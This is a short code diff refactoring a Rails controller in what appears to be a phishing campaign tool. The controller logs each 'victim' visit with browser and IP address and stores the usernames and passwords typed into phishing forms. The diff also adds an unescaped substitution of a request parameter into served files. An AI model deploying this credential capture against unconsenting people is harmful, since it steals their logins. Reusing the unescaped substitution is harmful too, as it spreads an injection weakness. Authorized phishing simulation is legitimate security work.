@@ -15,17 +15,15 @@ class SiteDeliveryController < ApplicationController
   end
 
   def create_visit(victim, extra)
-    visit = Visit.new
-    visit.victim_id = victim.id
+    visit = victim.build_visit
     visit.browser = request.env['HTTP_USER_AGENT']
     visit.ip_address = request.env['HTTP_X_FORWARDED_FOR'] || request.remote_ip
     visit.extra = extra
 
     if params[:PasswordForm]
-      credential = Credential.new
+      credential = visit.build_credential
       credential.username = params[:UsernameForm].to_s
       credential.password = params[:PasswordForm].to_s
-      credential.visit = visit
     end
 
     visit.save unless victim.id == '000000'
@@ -76,6 +74,11 @@ class SiteDeliveryController < ApplicationController
       if attachment.file_identifier.downcase == params[:filename].downcase
         begin
           f = File.read(attachment.file.current_path)
+
+          # TODO: Document that this replacement takes place
+          # but only for HTTP content types... Javascript may also be
+          # wanted?
+          f.gsub!('<%= UID %>', params[:uid])
           content_type = attachment.file.content_type
           if content_type.include?('http')
             render text: f
